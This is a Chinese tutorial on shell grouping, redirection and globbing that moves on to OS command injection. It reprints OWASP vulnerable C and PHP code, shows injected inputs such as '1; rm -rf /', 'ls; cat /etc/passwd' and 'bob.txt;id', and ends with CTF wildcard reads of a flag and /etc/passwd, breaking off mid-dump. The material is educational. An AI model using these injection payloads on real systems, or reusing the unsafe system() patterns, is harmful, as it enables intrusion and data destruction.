\u90a3\u4e48\uff0c\u4e0b\u9762\u53c8\u6d89\u53ca\u5230\u4e86\u4e00\u4e2a\u95ee\u9898\uff0c\u5c31\u662f\u5c0f\u62ec\u53f7\uff0c\u4e2d\u62ec\u53f7\uff0c\u548c\u5927\u62ec\u53f7\u7684\u533a\u522b\u3002 \u5355\u5c0f\u62ec\u53f7\uff0c(cmd1;cmd2;cmd3) \u65b0\u5f00\u4e00\u4e2a\u5b50shell\u987a\u5e8f\u6267\u884c\u547d\u4ee4cmd1,cmd2,cmd3, \u5404\u547d\u4ee4\u4e4b\u95f4\u7528\u5206\u53f7\u9694\u5f00, \u6700\u540e\u4e00\u4e2a\u547d\u4ee4\u540e\u53ef\u4ee5\u6ca1\u6709\u5206\u53f7\u3002\u628a command group \u653e\u5728 subshell \u53bb\u6267\u884c\uff0c\u4e5f\u53eb\u505a nested sub-shell \u3002 \u5355\u5927\u62ec\u53f7\uff0c{ cmd1;cmd2;cmd3;} \u5728\u5f53\u524dshell\u987a\u5e8f\u6267\u884c\u547d\u4ee4cmd1,cmd2,cmd3, \u5404\u547d\u4ee4\u4e4b\u95f4\u7528\u5206\u53f7\u9694\u5f00, \u6700\u540e\u4e00\u4e2a\u547d\u4ee4\u540e\u5fc5\u987b\u6709\u5206\u53f7, \u7b2c\u4e00\u6761\u547d\u4ee4\u548c\u5de6\u62ec\u53f7\u4e4b\u95f4\u5fc5\u987b\u7528\u7a7a\u683c\u9694\u5f00\u3002\u82b1\u62ec\u53f7\u662f\u5728\u540c\u4e00\u4e2a shell \u5167\u5b8c\u6210\uff0c\u4e5f\u79f0\u4e3a non-namedcommand group \u3002 \u6240\u4ee5\u8bf4\uff0c\u5982\u679c\u5728shell\u91cc\u9762\u6267\u884c\u201c\u51fd\u6570\u201d\uff0c\u9700\u8981\u7528\u5230{}\uff0c\u5b9e\u9645\u4e0a\u4e5f\u5c31\u662f\u4e00\u4e2a\u547d\u4ee4\u7fa4\u7ec4\u4e48\u3002 \u4e0d\u8fc7\uff0c\u6839\u636e\u5b9e\u6d4b\uff0c test=$(ls -a) \u53ef\u4ee5\u6267\u884c\uff0c\u4f46\u662f test=${ls\u2013a} \u8bed\u6cd5\u4e0a\u9762\u662f\u6709\u9519\u8bef\u7684\u3002\u4f30\u8ba1\u4e5f\u548c\u4e0a\u9762\u6240\u8bf4\u7684\u539f\u56e0\u6709\u5173\u3002 \u53e6\u5916\uff0c\u4ece\u7f51\u4e0a\u6458\u5f55\u7684\u533a\u522b\u5982\u4e0b\uff1a ()\u53ea\u662f\u5bf9\u4e00\u4e32\u547d\u4ee4\u91cd\u65b0\u5f00\u4e00\u4e2a\u5b50shell\u8fdb\u884c\u6267\u884c {}\u5bf9\u4e00\u4e32\u547d\u4ee4\u5728\u5f53\u524dshell\u6267\u884c ()\u548c{}\u90fd\u662f\u628a\u4e00\u4e32\u7684\u547d\u4ee4\u653e\u5728\u62ec\u53f7\u91cc\u9762\uff0c\u5e76\u4e14\u547d\u4ee4\u4e4b\u95f4\u7528;\u53f7\u9694\u5f00 ()\u6700\u540e\u4e00\u4e2a\u547d\u4ee4\u53ef\u4ee5\u4e0d\u7528\u5206\u53f7 {}\u6700\u540e\u4e00\u4e2a\u547d\u4ee4\u8981\u7528\u5206\u53f7 {}\u7684\u7b2c\u4e00\u4e2a\u547d\u4ee4\u548c\u5de6\u62ec\u53f7\u4e4b\u95f4\u5fc5\u987b\u8981\u6709\u4e00\u4e2a\u7a7a\u683c ()\u91cc\u7684\u5404\u547d\u4ee4\u4e0d\u5fc5\u548c\u62ec\u53f7\u6709\u7a7a\u683c ()\u548c{}\u4e2d\u62ec\u53f7\u91cc\u9762\u7684\u67d0\u4e2a\u547d\u4ee4\u7684\u91cd\u5b9a\u5411\u53ea\u5f71\u54cd\u8be5\u547d\u4ee4\uff0c\u4f46\u62ec\u53f7\u5916\u7684\u91cd\u5b9a\u5411\u5219\u5f71\u54cd\u5230\u62ec\u53f7\u91cc\u7684\u6240\u6709\u547d\u4ee4 \u8fd9\u91cc\u5f15\u51fa\u6765 [..] \u548c [[...]] \u7684\u533a\u522b\uff1a\u4f7f\u7528 [[...]] \u6761\u4ef6\u5224\u65ad\u7ed3\u6784, \u800c\u4e0d\u662f [...] , \u80fd\u591f\u9632\u6b62\u811a\u672c\u4e2d\u7684\u8bb8\u591a\u903b\u8f91\u9519\u8bef.\u6bd4\u5982 && , || , < ,\u548c > \u64cd\u4f5c\u7b26\u80fd\u591f\u6b63\u5e38\u5b58\u5728\u4e8e [[ ]] \u6761\u4ef6\u5224\u65ad\u7ed3\u6784\u4e2d, \u4f46\u662f\u5982\u679c\u51fa\u73b0\u5728 [] \u7ed3\u6784\u4e2d\u7684\u8bdd\uff0c\u4f1a\u62a5\u9519\u3002 \u5bf9 {} \u548c () \u800c\u8a00, \u62ec\u53f7\u4e2d\u7684\u91cd\u5b9a\u5411\u7b26\u53ea\u5f71\u54cd\u8be5\u6761\u547d\u4ee4\uff0c \u800c\u62ec\u53f7\u5916\u7684\u91cd\u5b9a\u5411\u7b26\u5f71\u54cd\u5230\u62ec\u53f7\u4e2d\u7684\u6240\u6709\u547d\u4ee4\u3002 \u8f93\u5165\u8f93\u51fa/\u91cd\u5b9a\u5411 > >> < << :> &> 2&> 2<>>& >&2 \u6587\u4ef6\u63cf\u8ff0\u7b26(File Descriptor)\uff0c\u7528\u4e00\u4e2a\u6570\u5b57\uff08\u901a\u5e38\u4e3a0-9\uff09\u6765\u8868\u793a\u4e00\u4e2a\u6587\u4ef6\u3002 \u6587\u4ef6\u63cf\u8ff0\u7b26 \u540d\u79f0 \u5e38\u7528\u7f29\u5199 \u9ed8\u8ba4\u503c 0 \u6807\u51c6\u8f93\u5165 stdin \u952e\u76d8 1 \u6807\u51c6\u8f93\u51fa stdout \u5c4f\u5e55 2 \u6807\u51c6\u9519\u8bef\u8f93\u51fa stderr \u5c4f\u5e55 \u6211\u4eec\u5728\u7b80\u5355\u5730\u7528 < \u6216 > \u65f6\uff0c\u76f8\u5f53\u4e8e\u4f7f\u7528 0< \u6216 1> \uff08\u4e0b\u9762\u4f1a\u8be6\u7ec6\u4ecb\u7ecd\uff09\u3002 cmd > file \u628acmd\u547d\u4ee4\u7684\u8f93\u51fa\u91cd\u5b9a\u5411\u5230\u6587\u4ef6file\u4e2d\u3002\u5982\u679cfile\u5df2\u7ecf\u5b58\u5728\uff0c\u5219\u6e05\u7a7a\u539f\u6709\u6587\u4ef6\uff0c\u4f7f\u7528bash\u7684noclobber\u9009\u9879\u53ef\u4ee5\u9632\u6b62\u590d\u76d6\u539f\u6709\u6587\u4ef6\u3002 cmd \u00bb file \u628acmd\u547d\u4ee4\u7684\u8f93\u51fa\u91cd\u5b9a\u5411\u5230\u6587\u4ef6file\u4e2d\uff0c\u5982\u679cfile\u5df2\u7ecf\u5b58\u5728\uff0c\u5219\u628a\u4fe1\u606f\u52a0\u5728\u539f\u6709\u6587\u4ef6\u540e\u9762\u3002 cmd < file \u4f7fcmd\u547d\u4ee4\u4ecefile\u8bfb\u5165 cmd \u00ab text \u4ece\u547d\u4ee4\u884c\u8bfb\u53d6\u8f93\u5165\uff0c\u76f4\u5230\u4e00\u4e2a\u4e0etext\u76f8\u540c\u7684\u884c\u7ed3\u675f\u3002\u9664\u975e\u4f7f\u7528\u5f15\u53f7\u628a\u8f93\u5165\u62ec\u8d77\u6765\uff0c\u6b64\u6a21\u5f0f\u5c06\u5bf9\u8f93\u5165\u5185\u5bb9\u8fdb\u884cshell\u53d8\u91cf\u66ff\u6362\u3002\u5982\u679c\u4f7f\u7528 <<- \uff0c\u5219\u4f1a\u5ffd\u7565\u63a5\u4e0b\u6765\u8f93\u5165\u884c\u9996\u7684tab\uff0c\u7ed3\u675f\u884c\u4e5f\u53ef\u4ee5\u662f\u4e00\u5806tab\u518d\u52a0\u4e0a\u4e00\u4e2a\u4e0etext\u76f8\u540c\u7684\u5185\u5bb9\uff0c\u53ef\u4ee5\u53c2\u8003\u5f8c\u9762\u7684\u4f8b\u5b50\u3002 cmd \u00ab< word \u628aword\uff08\u800c\u4e0d\u662f\u6587\u4ef6word\uff09\u548c\u540e\u9762\u7684\u6362\u884c\u4f5c\u4e3a\u8f93\u5165\u63d0\u4f9b\u7ed9cmd\u3002 cmd <> file \u4ee5\u8bfb\u5199\u6a21\u5f0f\u628a\u6587\u4ef6file\u91cd\u5b9a\u5411\u5230\u8f93\u5165\uff0c\u6587\u4ef6file\u4e0d\u4f1a\u88ab\u7834\u574f\u3002\u4ec5\u5f53\u5e94\u7528\u7a0b\u5e8f\u5229\u7528\u4e86\u8fd9\u4e00\u7279\u6027\u65f6\uff0c\u5b83\u624d\u662f\u6709\u610f\u4e49\u7684\u3002 cmd >| file \u529f\u80fd\u540c>\uff0c\u4f46\u5373\u4fbf\u5728\u8bbe\u7f6e\u4e86noclobber\u65f6\u4e5f\u4f1a\u590d\u76d6file\u6587\u4ef6\uff0c\u6ce8\u610f\u7528\u7684\u662f|\u800c\u975e\u4e00\u4e9b\u4e66\u4e2d\u8bf4\u7684!\uff0c\u76ee\u524d\u4ec5\u5728csh\u4e2d\u4ecd\u6cbf\u7528 >! \u5b9e\u73b0\u8fd9\u4e00\u529f\u80fd\u3002 : > filename \u628a\u6587\u4ef6 filename \u622a\u65ad\u4e3a0\u957f\u5ea6\u3002\u5982\u679c\u6587\u4ef6\u4e0d\u5b58\u5728, \u90a3\u4e48\u5c31\u521b\u5efa\u4e00\u4e2a0\u957f\u5ea6\u7684\u6587\u4ef6(\u4e0e touch \u7684\u6548\u679c\u76f8\u540c). * cmd >&n \u628a\u8f93\u51fa\u9001\u5230\u6587\u4ef6\u63cf\u8ff0\u7b26n * cmd m>&n \u628a\u8f93\u51fa\u5230\u6587\u4ef6\u7b26m\u7684\u4fe1\u606f\u91cd\u5b9a\u5411\u5230\u6587\u4ef6\u63cf\u8ff0\u7b26n * cmd >&- \u5173\u95ed\u6807\u51c6\u8f93\u51fa * cmd <&n \u8f93\u5165\u6765\u81ea\u6587\u4ef6\u63cf\u8ff0\u7b26n * cmd m<&n m\u6765\u81ea\u6587\u4ef6\u63cf\u8ff0\u5404\u4e2an * cmd <&- \u5173\u95ed\u6807\u51c6\u8f93\u5165 * cmd <&n- \u79fb\u52a8\u8f93\u5165\u6587\u4ef6\u63cf\u8ff0\u7b26n\u800c\u975e\u590d\u5236\u5b83\u3002 * cmd >&n- \u79fb\u52a8\u8f93\u51fa\u6587\u4ef6\u63cf\u8ff0\u7b26n\u800c\u975e\u590d\u5236\u5b83\u3002 \u6ce8\u610f\uff1a >& \u5b9e\u9645\u4e0a\u590d\u5236\u4e86\u6587\u4ef6\u63cf\u8ff0\u7b26\uff0c\u8fd9\u4f7f\u5f97 cmd > file 2>&1 \u4e0e cmd 2>&1 >file \u7684\u6548\u679c\u4e0d\u4e00\u6837\u3002 \u901a\u914d\u7b26 \u8fd8\u6709\u4e00\u7c7b\u901a\u914d\u7b26\uff0c\u9996\u5148\u5148\u4e86\u89e3\u4e0b\u4ec0\u4e48\u662fLinux shell\u901a\u914d\u7b26/glob\u6a21\u5f0f: glob \u6a21\u5f0f\uff08globbing\uff09\u4e5f\u88ab\u79f0\u4e4b\u4e3a shell \u901a\u914d\u7b26\uff0c\u540d\u5b57\u7684\u8d77\u6e90\u6765\u81ea\u4e8e Unix V6 \u4e2d\u7684 /etc/glob \uff08\u8be6\u89c1 man \u6587\u6863\uff09\u3002glob \u662f\u4e00\u79cd\u7279\u6b8a\u7684\u6a21\u5f0f\u5339\u914d\uff0c\u6700\u5e38\u89c1\u7684\u662f\u901a\u914d\u7b26\u62d3\u5c55\uff0c\u4e5f\u53ef\u4ee5\u5c06 glob \u6a21\u5f0f\u8bbe\u4e3a\u7cbe\u7b80\u4e86\u7684\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u5728\u6700\u65b0\u7684 CentOS 7 \u4e2d\u5df2\u7ecf\u5220\u9664\u4e86 glob \u7684\u76f8\u5173\u63cf\u8ff0\u6587\u6863\uff0c\u5220\u9664\u7684\u539f\u56e0\u7531\u4e8e glob \u5df2\u7ecf\u6574\u5408\u5230\u4e86 shell \u4e4b\u4e2d\uff0c\u7136\u540e\u5c31\u6709\u4e86 shell \u901a\u914d\u7b26\u3002 shell \u901a\u914d\u7b26 / glob \u6a21\u5f0f\u901a\u5e38\u7528\u6765\u5339\u914d\u76ee\u5f55\u4ee5\u53ca\u6587\u4ef6\uff0c\u800c\u4e0d\u662f\u6587\u672c\uff01\uff01\uff01 \u8bed\u6cd5 \u5b57\u7b26 \u89e3\u91ca * \u5339\u914d\u4efb\u610f\u957f\u5ea6\u4efb\u610f\u5b57\u7b26 ? \u5339\u914d\u4efb\u610f\u5355\u4e2a\u5b57\u7b26 [list] \u5339\u914d\u6307\u5b9a\u8303\u56f4\u5185\uff08list\uff09\u4efb\u610f\u5355\u4e2a\u5b57\u7b26\uff0c\u4e5f\u53ef\u4ee5\u662f\u5355\u4e2a\u5b57\u7b26\u7ec4\u6210\u7684\u96c6\u5408 [^list] \u5339\u914d\u6307\u5b9a\u8303\u56f4\u5916\u7684\u4efb\u610f\u5355\u4e2a\u5b57\u7b26\u6216\u5b57\u7b26\u96c6\u5408 [!list] \u540c [^list] {str1,str2,\u2026} \u5339\u914d srt1 \u6216\u8005 srt2 \u6216\u8005\u66f4\u591a\u5b57\u7b26\u4e32\uff0c\u4e5f\u53ef\u4ee5\u662f\u96c6\u5408 IFS \u7531 < space > \u6216 < tab > \u6216 < enter > \u4e09\u8005\u4e4b\u4e00\u7ec4\u6210 CR \u7531 < enter > \u4ea7\u751f ! \u6267\u884c history \u4e2d\u7684\u547d\u4ee4 \u4ee5\u53ca\u8fd8\u6709\u4e13\u7528\u5b57\u7b26\u96c6 \u5b57\u7b26 \u610f\u4e49 [:alnum:] \u4efb\u610f\u6570\u5b57\u6216\u8005\u5b57\u6bcd [:alpha:] \u4efb\u610f\u5b57\u6bcd [:space:] \u7a7a\u683c [:lower:] \u5c0f\u5199\u5b57\u6bcd [:digit:] \u4efb\u610f\u6570\u5b57 [:upper:] \u4efb\u610f\u5927\u5199\u5b57\u6bcd [:cntrl:] \u63a7\u5236\u7b26 [:graph:] \u56fe\u5f62 [:print:] \u53ef\u6253\u5370\u5b57\u7b26 [:punct:] \u6807\u70b9\u7b26\u53f7 [:xdigit:] \u5341\u516d\u8fdb\u5236\u6570 [:blank:] \u7a7a\u767d\u5b57\u7b26 \u5728\u4f7f\u7528\u4e13\u5c5e\u5b57\u7b26\u96c6\u7684\u65f6\u5019\uff0c\u5b57\u7b26\u96c6\u4e4b\u5916\u8fd8\u9700\u8981\u7528 \u6765\u5305\u542b\u4f4f\uff0c\u5426\u5219\u4e13\u7528\u5b57\u7b26\u96c6\u4e0d\u4f1a\u751f\u6548\uff0c\u4f8b\u5982 [[:space:]] \u60f3\u8981\u8f6c\u4e49\u7684\u65f6\u5019\uff0c\u5355\u5f15\u53f7\u4e0e\u53cc\u5f15\u53f7\u4f7f\u7528\u65b9\u6cd5\u662f\u4e0d\u540c\u7684\uff0c\u5355\u5f15\u53f7\u4f1a\u8f6c\u4e49\u6240\u6709\u5b57\u7b26\uff0c\u800c\u4e14\u5355\u5f15\u53f7\u4e2d\u95f4\u4e0d\u5141\u8bb8\u518d\u51fa\u73b0\u5355\u5f15\u53f7\uff0c\u53cc\u5f15\u53f7\u5141\u8bb8\u51fa\u73b0\u7279\u5b9a\u7684 shell \u5143\u5b57\u7b26\uff0c\u5177\u4f53\u5b57\u7b26\u53ef\u4ee5\u81ea\u884c\u67e5\u8be2 \u5728\u4f7f\u7528\u82b1\u62ec\u53f7 {} \u7684\u65f6\u5019\uff0c\u91cc\u9762\u7684\u5355\u4e2a\u5b57\u7b26\u4e32\u9700\u8981\u4f7f\u7528\u5355\u5f15\u53f7\u6216\u8005\u53cc\u5f15\u53f7\u62ec\u4f4f\uff0c\u5426\u5219\u5c31\u4f1a\u89c6\u4e3a\u591a\u4e2a\u7684\u5355\u4e2a\u5b57\u7b26 \u4e3e\u4e2a\u4f8b\u5b50 \u4ee5\u4e0b\u4e8b\u4f8bExample 1-6\u6765\u6e90\u4e8e OWASP Example 1 \u4ee5\u4e0b\u4ee3\u7801\u662fUNIX\u547d\u4ee4 cat \u7684\u5305\u88c5\u5668\uff0c\u5b83\u5c06\u6587\u4ef6\u7684\u5185\u5bb9\u6253\u5370\u5230\u6807\u51c6\u8f93\u51fa\u3002 \u5b83\u4e5f\u662f\u53ef\u4ee5\u88ab\u6ce8\u5165\u7684\uff1a #include <stdio.h> #include <unistd.h> int main(int argc, char **argv) { char cat[] = \"cat \"; char *command; size_t commandLength; commandLength = strlen(cat) + strlen(argv[1]) + 1; command = (char *) malloc(commandLength); strncpy(command, cat, commandLength); strncat(command, argv[1], (commandLength - strlen(cat)) ); system(command); return (0); } \u6211\u4eec\u7f16\u8bd1\u5b8c\u4e4b\u540e\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u64cd\u4f5c\u6b63\u5e38\u4f7f\u7528 $ ./catWrapper Story.txt When last we left our heroes... \u4f46\u662f\uff0c\u5982\u679c\u6211\u4eec\u5728\u8fd9\u884c\u7684\u672b\u5c3e\u4e4b\u540e\u52a0\u4e00\u4e2a ; \u548c\u53e6\u4e00\u4e2a\u547d\u4ee4\uff0c\u90a3\u4e48\u547d\u4ee4 catWrapper \u6267\u884c\u800c\u4e14\u4e5f\u4e0d\u4f1a\u51fa\u9519\u3002 $ ./catWrapper \"Story.txt; ls\" When last we left our heroes... Story.txt doubFree.c nullpointer.c unstosig.c www* a.out* format.c strlen.c useFree* catWrapper* misnull.c strlength.c useFree.c commandinjection.c nodefault.c trunc.c writeWhatWhere.c \u5982\u679c\u5c06 catWrapper \u8bbe\u7f6e\u4e3a\u5177\u6709\u6bd4\u6807\u51c6\u7528\u6237\u66f4\u9ad8\u7684\u6743\u9650\u7ea7\u522b\uff0c\u5219\u53ef\u4ee5\u4f7f\u7528\u8be5\u66f4\u9ad8\u6743\u9650\u6267\u884c\u4efb\u610f\u547d\u4ee4\u3002 Example 2 \u4ee5\u4e0b\u7b80\u5355\u7a0b\u5e8f\u63a5\u53d7\u6587\u4ef6\u540d\u4f5c\u4e3a\u547d\u4ee4\u884c\u53c2\u6570\uff0c\u5e76\u5c06\u6587\u4ef6\u7684\u5185\u5bb9\u663e\u793a\u7ed9\u7528\u6237\u3002 \u8be5\u7a0b\u5e8f\u5b89\u88c5\u4e86 setuid root \uff0c\u5047\u8bbe\u539f\u672c\u5b83\u65e8\u5728\u7528\u4f5c\u5b66\u4e60\u5de5\u5177\uff0c\u5141\u8bb8\u7cfb\u7edf\u7ba1\u7406\u5458\u5728\u57f9\u8bad\u4e2d\u68c0\u67e5\u7279\u6743\u7cfb\u7edf\u6587\u4ef6\uff0c\u800c\u4e0d\u4f1a\u8ba9\u4ed6\u4eec\u4fee\u6539\u5b83\u4eec\u6216\u635f\u574f\u7cfb\u7edf\u3002 int main(char* argc, char** argv) { char cmd[CMD_MAX] = \"/usr/bin/cat \"; strcat(cmd, argv[1]); system(cmd); } \u7531\u4e8e\u7a0b\u5e8f\u4ee5 root \u6743\u9650\u8fd0\u884c\uff0c\u56e0\u6b64\u5bf9 system() \u7684\u8c03\u7528\u4e5f\u4ee5 root \u6743\u9650\u6267\u884c\u3002 \u5982\u679c\u7528\u6237\u6307\u5b9a\u6807\u51c6\u6587\u4ef6\u540d\uff0c\u5219\u7a0b\u5e8f\u8c03\u7528\u4f1a\u6309\u9884\u671f\u5de5\u4f5c\u3002 \u4f46\u662f\uff0c\u5982\u679c\u653b\u51fb\u8005\u4f20\u9012 1; rm -rf / \u5f62\u5f0f\u7684\u5b57\u7b26\u4e32\uff0c\u65e0\u8bba\u5f53\u524d\u76ee\u5f55\u662f\u5426\u6709 1 \u8fd9\u4e2a\u6587\u4ef6\uff0c\u90fd\u4f1a\u7ee7\u7eed\u5411\u4e0b\u6267\u884c rm -rf / \u3002 Example 3 \u672c\u4f8b\u4e2d\uff0c\u672c\u7a0b\u5e8f\u62e5\u6709\u5bf9\u5e94\u7684\u6743\u9650\uff0c\u4f7f\u7528\u73af\u5883\u53d8\u91cf $APPHOME \u6765\u786e\u5b9a\u5e94\u7528\u7a0b\u5e8f\u7684\u5b89\u88c5\u76ee\u5f55\uff0c\u7136\u540e\u5728\u8be5\u76ee\u5f55\u4e2d\u6267\u884c\u521d\u59cb\u5316\u811a\u672c char* home=getenv(\"APPHOME\"); char* cmd=(char*)malloc(strlen(home)+strlen(INITCMD)); if (cmd) { strcpy(cmd,home); strcat(cmd,INITCMD); execl(cmd, NULL); } \u672c\u4f8b\u524d\u63d0\u4e0e Example 2 \u4e2d\u4e00\u6837\uff0c\u6b64\u793a\u4f8b\u4e2d\u7684\u4ee3\u7801\u5141\u8bb8\u653b\u51fb\u8005\u4f7f\u7528\u5e94\u7528\u7a0b\u5e8f\u7684\u63d0\u5347\u6743\u9650\u6267\u884c\u4efb\u610f\u547d\u4ee4\u3002\u5728\u6b64\u793a\u4f8b\u4e2d\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u4fee\u6539\u73af\u5883\u53d8\u91cf $APPHOME \u901a\u8fc7\u5236\u5b9a\u4e0d\u540c\u7684\u8def\u5f84\u4ee5\u4f7f\u7528\u542b\u6709\u6076\u610f\u4ee3\u7801\u7684 INITCMD \u3002 \u7531\u4e8e\u7a0b\u5e8f\u4e0d\u9a8c\u8bc1\u4ece getenv() \u8bfb\u53d6\u7684\u503c\uff0c\u56e0\u6b64\u901a\u8fc7\u63a7\u5236\u73af\u5883\u53d8\u91cf\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u6b3a\u9a97\u5e94\u7528\u7a0b\u5e8f\u8fd0\u884c\u6076\u610f\u4ee3\u7801\u3002 \u653b\u51fb\u8005\u4f7f\u7528\u73af\u5883\u53d8\u91cf\u6765\u63a7\u5236\u7a0b\u5e8f\u8c03\u7528\u7684\u547d\u4ee4\uff0c\u56e0\u6b64\u5728\u6b64\u793a\u4f8b\u4e2d\u73af\u5883\u53d8\u91cf\u7684\u5f71\u54cd\u662f\u975e\u5e38\u5de8\u5927\u7684\u3002 Example 4 \u4e0b\u9762\u7684\u4ee3\u7801\u6765\u81ea\u57fa\u4e8e Web \u7684 CGI \u5b9e\u7528\u7a0b\u5e8f\uff0c\u5141\u8bb8\u7528\u6237\u66f4\u6539\u5176\u5bc6\u7801\u3002 NIS\u4e0b\u7684\u5bc6\u7801\u66f4\u65b0\u8fc7\u7a0b\u5305\u62ec\u5728 /var/yp \u76ee\u5f55\u4e2d\u8fd0\u884c make \u3002 \u8bf7\u6ce8\u610f\uff0c\u7531\u4e8e\u7a0b\u5e8f\u66f4\u65b0\u5bc6\u7801\u8bb0\u5f55\uff0c\u56e0\u6b64\u5df2\u5b89\u88c5 setuid root \u3002\u51fd\u6570\u5bf9 make \u8c03\u7528\u5982\u4e0b\uff1a system(\"cd /var/yp && make &> /dev/null\"); \u4e0e\u524d\u9762\u7684\u793a\u4f8b\u4e0d\u540c\uff0c\u6b64\u793a\u4f8b\u4e2d\u7684\u547d\u4ee4\u662f\u6ca1\u6709\u53ef\u63a7\u8f93\u5165\u7684\u786c\u7f16\u7801\uff0c\u56e0\u6b64\u653b\u51fb\u8005\u65e0\u6cd5\u63a7\u5236\u4f20\u9012\u7ed9 system() \u7684\u53c2\u6570\u3002\u4f46\u662f\uff0c\u7531\u4e8e\u7a0b\u5e8f\u6ca1\u6709\u4e3amake\u6307\u5b9a\u7edd\u5bf9\u8def\u5f84\uff0c\u5e76\u4e14\u5728\u8c03\u7528\u547d\u4ee4\u4e4b\u524d\u6ca1\u6709\u64e6\u9664\u4efb\u4f55\u73af\u5883\u53d8\u91cf\uff0c\u56e0\u6b64\u653b\u51fb\u8005\u53ef\u4ee5\u4fee\u6539\u5176 $PATH \u53d8\u91cf\u4ee5\u6307\u5411\u540d\u4e3a make \u7684\u6076\u610f\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u5e76\u4ece\u4e2d\u6267\u884c CGI \u811a\u672c\u3002 shell \u63d0\u793a\u3002\u7531\u4e8e\u8be5\u7a0b\u5e8f\u5df2\u7ecf\u5b89\u88c5\u4e86 setuid root \uff0c\u56e0\u6b64\u653b\u51fb\u8005\u7684 make \u7248\u672c\u73b0\u5728\u4ee5 root \u6743\u9650\u8fd0\u884c\u3002 \u73af\u5883\u5728\u7a0b\u5e8f\u4e2d\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u65b9\u9762\u53d1\u6325\u7740\u91cd\u8981\u4f5c\u7528\u3002 system() \u548c exec() \u4e4b\u7c7b\u7684\u51fd\u6570\u4f7f\u7528\u8c03\u7528\u5b83\u4eec\u7684\u7a0b\u5e8f\u73af\u5883\uff0c\u56e0\u6b64\u653b\u51fb\u8005\u6709\u53ef\u80fd\u5f71\u54cd\u8fd9\u4e9b\u8c03\u7528\u7684\u884c\u4e3a\u3002 \u6709\u5f88\u591a\u6587\u7ae0\u4f1a\u63d0\u5230 Java \u7684 Runtime.exec \u4e0e C \u7684\u7cfb\u7edf\u529f\u80fd\u5b8c\u5168\u76f8\u540c\u3002\u5176\u5b9e\u4e0d\u7136\u3002\u867d\u7136\u4e24\u8005\u90fd\u5141\u8bb8\u8c03\u7528\u65b0\u7684\u7a0b\u5e8f/\u8fdb\u7a0b\uff0c\u4f46\u662f\uff0c C \u7684\u7cfb\u7edf\u51fd\u6570\u5c06\u5176\u53c2\u6570\u4f20\u9012\u7ed9\u8981\u89e3\u6790\u7684 shell(/bin/sh) \uff0c\u800c Runtime.exec \u5c1d\u8bd5\u5c06\u5b57\u7b26\u4e32\u62c6\u5206\u4e3a\u5355\u8bcd\u6570\u7ec4\uff0c\u7136\u540e\u4f7f\u7528\u5176\u4f59\u5355\u8bcd\u6267\u884c\u6570\u7ec4\u4e2d\u7684\u7b2c\u4e00\u4e2a\u5355\u8bcd\u4f5c\u4e3a\u53c2\u6570\u3002 Runtime.exec \u4e0d\u4f1a\u5c1d\u8bd5\u5728\u4efb\u4f55\u65f6\u5019\u8c03\u7528 shell \u3002\u5173\u952e\u7684\u533a\u522b\u5728\u4e8e shell \u63d0\u4f9b\u7684\u5927\u90e8\u5206\u529f\u80fd\u53ef\u88ab\u6076\u610f\u5229\u7528\u7684\u70b9\uff08\u4f8b\u5982 \uff06 \uff0c && \uff0c | \uff0c || \u7b49\u94fe\u63a5\u547d\u4ee4\uff0c\u91cd\u5b9a\u5411\u8f93\u5165\u548c\u8f93\u51fa\uff09\u5c06\u7b80\u5355\u5730\u7ed3\u675f\u4f5c\u4e3a\u4f20\u9012\u7ed9\u7b2c\u4e00\u4e2a\u547d\u4ee4\u7684\u53c2\u6570\uff0c\u53ef\u80fd\u5bfc\u81f4\u8bed\u6cd5\u9519\u8bef\uff0c\u6216\u88ab\u629b\u51fa\u4f5c\u4e3a\u65e0\u6548\u53c2\u6570\u3002 Example 5 \u4ee5\u4e0b\u7b80\u5355\u7684\u4ee3\u7801\u7247\u6bb5\u6613\u53d7 Unix/Linux \u5e73\u53f0\u4e0a\u7684OS\u547d\u4ee4\u6ce8\u5165\u653b\u51fb\uff1a #include <stdlib.h> #include <stdio.h> #include <string.h> int main(int argc, char **argv) { char command[256]; if(argc != 2) { printf(\"Error: Please enter a program to time!\\n\"); return -1; } memset(&command, 0, sizeof(command)); strcat(command, \"time ./\"); strcat(command, argv[1]); system(command); return 0; } \u5982\u679c\u8fd9\u662f\u4e00\u4e2a suid \u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u8bf7\u8003\u8651\u653b\u51fb\u8005\u8f93\u5165\u4ee5\u4e0b\u5185\u5bb9\u7684\u60c5\u51b5: ls; cat /etc/passwd \u3002 \u5728Unix\u73af\u5883\u4e2d\uff0c shell \u547d\u4ee4\u7528\u5206\u53f7\u5206\u9694\u3002 \u6211\u4eec\u73b0\u5728\u53ef\u4ee5\u968f\u610f\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\uff01 Example 6 <?php print(\"Please specify the name of the file to delete\"); print(\"<p>\"); $file=$_GET['filename']; system(\"rm $file\"); ?> \u4ee5\u4e0b\u6210\u529f\u653b\u51fb\u7684\u793a\u4f8b\uff1a Request: http://127.0.0.1/delete.php?filename=bob.txt;id Response: Please specify the name of the file to delete uid=33(www-data) gid=33(www-data) groups=33(www-data) \u518d\u4e3e\u4e2a\u4f8b\u5b50 ?\u7684\u4f7f\u7528 $ cat /fl?? NUAACTF{56723419231} $ cat /???/??ss daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network 